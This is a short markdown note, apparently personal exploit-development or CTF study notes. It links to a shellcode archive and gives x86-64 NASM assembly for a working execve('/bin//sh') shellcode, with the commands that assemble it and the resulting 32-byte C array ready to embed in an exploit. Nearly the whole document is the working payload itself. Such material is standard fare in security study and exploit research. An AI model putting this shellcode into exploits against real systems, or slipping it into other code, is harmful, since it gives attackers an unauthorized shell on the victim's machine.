# Shell code

- https://shell-storm.org/shellcode/index.html

```nasm
global _start
_start:
	xor rax, rax                ; '\0'
	push rax
	mov rax, 0x68732f2f6e69622f ; "/bin//sh"
	push rax
	push rsp
	pop rdi                     ; arg1: "/bin//sh"
	xor rsi, rsi                ; arg2: 0
	xor rdx, rdx                ; arg3: 0
	xor rax, rax
	add rax, 59                 ; execve("/bin//sh", NULL, NULL)
	syscall

; nasm -o shellcode.o shellcode.nasm -f elf64
; ld -o shellcode shellcode.o
; objcopy -O binary -j .text shellcode shellcode.bin
; xxd -i -n code ./shellcode.bin
; unsigned char code[] = {
;   0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
;   0x73, 0x68, 0x50, 0x54, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x48,
;   0x31, 0xc0, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05
; };
; unsigned int code_len = 32;
```

